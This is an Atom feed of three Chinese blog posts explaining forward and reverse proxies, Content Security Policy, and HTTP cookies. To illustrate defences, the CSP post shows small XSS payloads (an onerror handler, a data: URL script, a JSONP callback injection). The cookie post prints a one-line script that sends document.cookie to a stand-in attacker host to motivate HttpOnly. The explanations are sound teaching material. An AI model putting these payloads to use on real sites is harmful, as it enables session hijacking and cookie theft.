<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://leecss.com</id>
    <title>当下</title>
    <updated>2021-08-07T14:57:28.684Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://leecss.com"/>
    <link rel="self" href="https://leecss.com/atom.xml"/>
    <logo>https://leecss.com/images/avatar.png</logo>
    <icon>https://leecss.com/favicon.ico</icon>
    <rights>All rights reserved 2021, 当下</rights>
    <entry>
        <title type="html"><![CDATA[http-正向代理和反向代理]]></title>
        <id>https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/</id>
        <link href="https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/">
        </link>
        <updated>2021-08-07T14:51:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>Web 上的代理服务器是代表客户端完成事务处理的中间人。如果没有 Web 代理， HTTP 客户端就要直接与 HTTP 服务器进行对话。有了 Web 代理，客户端就可以与代理进行对话，然后由代理代表客户端与服务器进行交流。客户端仍然会完成对事务的处理，但它是通过代理服务器提供的优质服务来实现的。</p>
<p>HTTP 的代理服务器既是 Web 服务器又是 Web 客户端。HTTP 客户端会向代理发送请求报文，代理服务器必须像 Web 服务器一样，正确地处理请求和连接，然后返回响应。同时，代理自身要向服务器发送请求，这样，其行为就必须像正确的 HTTP 客户端一样，要发送请求并接收响应。如果要创建自己的 HTTP 代理，就要认真地遵循为 HTTP 客户端和 HTTP 服务器制定的规则。</p>
<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628347950236.webp" alt="" loading="lazy"></figure>
<h2 id="类比学习">类比学习</h2>
<h3 id="点餐">点餐</h3>
<h4 id="没有代理">没有代理</h4>
<p>假如餐厅是厨师自己开的，厨师自己做饭提供给客户，我们下单，然后厨师把饭提供给我们。</p>
<p>我们是客户端，厨师是服务端，没有代理</p>
<h4 id="正向代理">正向代理</h4>
<p>假如餐厅中有一名厨师，和一名服务员，我们下单告诉服务员，服务员告诉厨师，厨师做好饭后交给服务员，服务员端给我们。</p>
<p>我们是客户端，服务员是正向代理，厨师是服务端。</p>
<p>在这个过程中，服务员代替我们去告诉厨师想要吃的饭，厨师只知道服务员，并不知道最终吃饭的人是谁。</p>
<h4 id="反向代理">反向代理</h4>
<p>假如餐厅中有一名服务员，下单系统，和多名厨师，我们下单告诉服务员，服务员在下单系统上提交菜品，下单系统按照忙闲情况分配了厨师。</p>
<p>我们是客户端，服务员是正向代理，下单系统是反向代理，厨师是服务端</p>
<p>在这个过程中，我们只知道是在下单系统上提交的订单，但是不知道是哪位厨师提供的</p>
<h3 id="借钱">借钱</h3>
<p><strong>假设由A、B和C三人，他们之间存在借钱的关系。</strong></p>
<h4 id="正向代理-2">正向代理</h4>
<ol>
<li>A需要钱，A知道C由很多钱，想向C借钱</li>
<li>但是A和C有矛盾，于是A想到通过B去借C借钱</li>
<li>B向C借到钱了，C不知道是A的存在</li>
<li>这样B就帮助A借到了Z的钱</li>
</ol>
<p>在这个过程，B就充当了代理借钱的角色，并且是代替A去借钱的，这样就是正向代理。</p>
<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1628348139202.png" alt="" loading="lazy"></figure>
<h4 id="反向代理-2">反向代理</h4>
<ol>
<li>A需要钱，C有很多钱，A不知道C很多钱</li>
<li>A找B借钱</li>
<li>B知道C有很多钱</li>
<li>B向C借钱，并把借到的钱给A，而没有使用自己的钱借给A</li>
<li>A拿到钱以后，以为钱是B的，A不知道C的存在</li>
</ol>
<p>在这个过程当中，B也充当了代理借钱的角色，不过这次不是代替A去借的，而是用C的钱借给A的，换言之即是代替C将钱借给了A，这就是反向代理。</p>
<figure data-type="image" tabindex="3"><img src="https://leecss.com/post-images/1628348150291.png" alt="" loading="lazy"></figure>
<h3 id="其他">其他</h3>
<p>正向代理: 买票的黄牛</p>
<p>反向代理: 租房的代理</p>
<h2 id="正向代理-3">正向代理</h2>
<p>是指是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容， 客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。</p>
<figure data-type="image" tabindex="4"><img src="https://leecss.com/post-images/1628348113934.png" alt="" loading="lazy"></figure>
<h3 id="特点">特点</h3>
<ol>
<li>代理客户;</li>
<li>隐藏真实的客户，为客户端收发请求，使真实客户端对服务器不可见;</li>
<li>一个局域网内的所有用户可能被一台服务器做了正向代理，由该台服务器负责 HTTP 请求;</li>
<li>意味着同服务器做通信的是正向代理服务器;</li>
</ol>
<h3 id="作用">作用</h3>
<ol>
<li>访问原来无法访问的资源，如google</li>
<li>可以做缓存，加速访问资源</li>
<li>对客户端访问授权，上网进行认证</li>
<li>代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</li>
</ol>
<figure data-type="image" tabindex="5"><img src="https://leecss.com/post-images/1628348191475.jpg" alt="" loading="lazy"></figure>
<h2 id="反向代理-3">反向代理</h2>
<p>是指以代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>
<figure data-type="image" tabindex="6"><img src="https://leecss.com/post-images/1628348098770.png" alt="" loading="lazy"></figure>
<h3 id="特点-2">特点</h3>
<ol>
<li>代理服务器;</li>
<li>隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见;</li>
<li>负载均衡服务器，将用户的请求分发到空闲的服务器上;</li>
<li>意味着用户和负载均衡服务器直接通信，即用户解析服务器域名时得到的是负载均衡服务器的 IP ;</li>
</ol>
<h3 id="作用-2">作用</h3>
<ol>
<li>保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击</li>
<li>负载均衡，通过反向代理服务器来优化网站的负载</li>
</ol>
<figure data-type="image" tabindex="7"><img src="https://leecss.com/post-images/1628348224249.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://leecss.com/post-images/1628348235535.jpg" alt="" loading="lazy"></figure>
<h2 id="总结">总结</h2>
<h3 id="共同点">共同点</h3>
<ol>
<li>都是做为服务器和客户端的中间层</li>
<li>都可以加强内网的安全性，阻止 web 攻击</li>
<li>都可以做缓存机制，提高访问速度</li>
</ol>
<h3 id="区别">区别</h3>
<ol>
<li>正向代理其实是客户端的代理,反向代理则是服务器的代理。</li>
<li>正向代理中，服务器并不知道真正的客户端到底是谁；而在反向代理中，客户端也不知道真正的服务器是谁。</li>
<li>作用不同。正向代理主要是用来解决访问限制问题；而反向代理则是提供负载均衡、安全防护等作用。</li>
</ol>
<h2 id="图解">图解</h2>
<figure data-type="image" tabindex="9"><img src="https://leecss.com/post-images/1628348020634.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://leecss.com/post-images/1628348030926.png" alt="" loading="lazy"></figure>
<h2 id="参考">参考</h2>
<p><a href="https://mp.weixin.qq.com/s/U5N4okQin9CJ4Bbl6U2EDA">如何向老板解释反向代理</a></p>
<p><a href="https://www.zhihu.com/question/24723688/answer/583903276">知乎-慕课网</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-Content Security Policy]]></title>
        <id>https://leecss.com/post/http-content-security-policy/</id>
        <link href="https://leecss.com/post/http-content-security-policy/">
        </link>
        <updated>2021-08-07T08:12:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一-简介">一、简介</h2>
<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self'; object-src 'none';
style-src cdn.example.org third-party.org; child-src https:
</code></pre>
<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
<pre><code class="language-html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
</code></pre>
<p>上面代码中，CSP 做了如下配置。</p>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<h2 id="二-限制选项">二、限制选项</h2>
<p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
<h3 id="资源加载限制">资源加载限制</h3>
<p>以下选项限制各类资源的加载。</p>
<ul>
<li><code>script-src</code>：外部脚本</li>
<li><code>style-src</code>：样式表</li>
<li><code>img-src</code>：图像</li>
<li><code>media-src</code>：媒体文件（音频和视频）</li>
<li><code>font-src</code>：字体文件</li>
<li><code>object-src</code>：插件（比如 Flash）</li>
<li><code>child-src</code>：框架</li>
<li><code>frame-ancestors</code>：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</li>
<li><code>connect-src</code>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li><code>worker-src</code>：<code>worker</code>脚本</li>
<li><code>manifest-src</code>：manifest 文件</li>
</ul>
<h3 id="default-src">default-src</h3>
<p><code>default-src</code>用来设置上面各个选项的默认值。</p>
<pre><code class="language-http">Content-Security-Policy: default-src 'self'
</code></pre>
<p>上面代码限制所有的外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
<h3 id="url-限制">URL 限制</h3>
<p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<ul>
<li><code>frame-ancestors</code>：限制嵌入框架的网页</li>
<li><code>base-uri</code>：限制<code>&lt;base#href&gt;</code></li>
<li><code>form-action</code>：限制<code>&lt;form#action&gt;</code></li>
</ul>
<h3 id="其他限制">其他限制</h3>
<p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<ul>
<li><code>block-all-mixed-content</code>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li><code>upgrade-insecure-requests</code>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li><code>plugin-types</code>：限制可以使用的插件格式</li>
<li><code>sandbox</code>：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<h3 id="report-uri">report-uri</h3>
<p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<pre><code class="language-http">Content-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
</code></pre>
<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
<pre><code class="language-json">{
  &quot;csp-report&quot;: {
    &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,
    &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,
    &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,
    &quot;violated-directive&quot;: &quot;script-src 'self' https://apis.google.com&quot;,
    &quot;original-policy&quot;: &quot;script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;
  }
}
</code></pre>
<h2 id="三-content-security-policy-report-only">三、Content-Security-Policy-Report-Only</h2>
<p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。</p>
<p>它必须与<code>report-uri</code>选项配合使用。</p>
<pre><code class="language-http">Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
</code></pre>
<h2 id="四-选项值">四、选项值</h2>
<p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>'self'</code>：当前域名，需要加引号</li>
<li>关键字<code>'none'</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
<p>多个值也可以并列，用空格分隔。</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://apis.google.com
</code></pre>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
<pre><code class="language-http"># 错误的写法
script-src https://host1.com; script-src https://host2.com

# 正确的写法
script-src https://host1.com https://host2.com
</code></pre>
<p>如果不设置某个限制选项，就是默认允许任何值。</p>
<h2 id="五-script-src-的特殊值">五、script-src 的特殊值</h2>
<p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<ul>
<li><code>'unsafe-inline'</code>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
<li><code>unsafe-eval</code>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li>nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
<li>hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
</code></pre>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<pre><code class="language-html">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;
  // some code
&lt;/script&gt;
</code></pre>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
</code></pre>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<pre><code class="language-html">&lt;script&gt;alert('Hello, world.');&lt;/script&gt;
</code></pre>
<p>注意，计算hash值的时候，<script>标签不算在内。</p>
<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h2 id="六-注意点">六、注意点</h2>
<p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;
&lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;
</code></pre>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<pre><code class="language-html">&lt;script
src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;
&lt;/script&gt;
</code></pre>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h2 id="转载">转载</h2>
<blockquote>
<p>阮一峰</p>
<p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html">https://www.ruanyifeng.com/blog/2016/09/csp.html</a></p>
</blockquote>
<h2 id="文档">文档</h2>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">MDN/HTTP/Headers/Content-Security-Policy</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-cookie]]></title>
        <id>https://leecss.com/post/http-cookie/</id>
        <link href="https://leecss.com/post/http-cookie/">
        </link>
        <updated>2021-08-04T14:33:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>
<ul>
<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
<li>追踪：记录和分析用户行为。</li>
</ul>
<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>
<p>Cookie 包含以下几方面的信息。</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间</li>
<li>所属域名（默认是当前域名）</li>
<li>生效的路径（默认是当前网址）</li>
</ul>
<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>
<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
<pre><code class="language-js">// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
</code></pre>
<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
<pre><code class="language-js">// 当前网页的 Cookie
document.cookie
</code></pre>
<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
<h2 id="来源">来源</h2>
<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。</p>
<p>使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。</p>
<p>可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。</p>
<p>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</p>
<p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”</strong>。</p>
<h2 id="原理">原理</h2>
<p>cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p>
<p><strong>cookie是服务端生成，客户端进行维护和存储</strong>。</p>
<p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个Set-Cookie选项，将cookie放入到响应请求中，在浏览器第二次发请求的时候，会通过Cookie请求头部将Cookie信息发送给服务器，服务端会辨别用户身份，另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628169793793.jpg" alt="" loading="lazy"></figure>
<h2 id="生成">生成</h2>
<p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
<pre><code class="language-http">Set-Cookie:foo=bar
</code></pre>
<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
<pre><code class="language-http">HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre>
<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
</code></pre>
<p>上面的几个属性的含义，将在后文解释。</p>
<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
</code></pre>
<p>下面是一个例子。</p>
<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre>
<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
<pre><code class="language-http">Set-Cookie: key1=value1; domain=example.com; path=/blog
</code></pre>
<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/blog
</code></pre>
<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/
</code></pre>
<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
<pre><code class="language-http">Cookie: key1=value1; key1=value2
</code></pre>
<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
<h3 id="demo-nodejs">demo-node.js</h3>
<p>服务端返回数据的时候，通过 <strong>Set-Cookie</strong> ，保存到浏览器中。</p>
<p>test.html</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta charset=&quot;UTF-8&quot;&gt;
  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div&gt;Content&lt;/div&gt;
&lt;/body&gt;
&lt;script&gt;
  console.log(document.cookie)
&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>server.js</p>
<pre><code class="language-js">const http = require('http')
const fs = require('fs')

http.createServer(function (request, response) {
  console.log('request come', request.url)

  if (request.url === '/') {
    const html = fs.readFileSync('test.html', 'utf8')
    response.writeHead(200, {
      'Content-Type': 'text/html',
      'Set-Cookie': ['id=123; max-age=2', 'abc=456;domain=test.com']
    })
    response.end(html)
  }

}).listen(8888)

console.log('server listening on 8888')
</code></pre>
<h2 id="发送">发送</h2>
<p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
<pre><code class="language-http">Cookie: foo=bar
</code></pre>
<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
<pre><code class="language-http">Cookie: name=value; name2=value2; name3=value3
</code></pre>
<p>下面是一个例子。</p>
<pre><code class="language-http">GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre>
<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
<ul>
<li>Cookie 的各种属性，比如何时过期。</li>
<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
</ul>
<h2 id="属性">属性</h2>
<h3 id="expiresmax-age">Expires，Max-Age</h3>
<p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre>
<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
<h3 id="domainpath">Domain，Path</h3>
<p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如<code>www.example.com</code>会设为<code>example.com</code>，而且以后如果访问<code>example.com</code>的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在<code>Set-Cookie</code>字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。</p>
<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
<h3 id="securehttponly">Secure，HttpOnly</h3>
<p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>Document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
<pre><code class="language-js">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
</code></pre>
<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
<h2 id="documentcookie">document.cookie</h2>
<p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
<pre><code class="language-js">document.cookie // &quot;foo=bar;baz=bar&quot;
</code></pre>
<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
<pre><code class="language-js">var cookies = document.cookie.split(';');

for (var i = 0; i &lt; cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
</code></pre>
<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
<pre><code class="language-js">document.cookie = 'fontSize=14';
</code></pre>
<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
<pre><code class="language-js">document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
</code></pre>
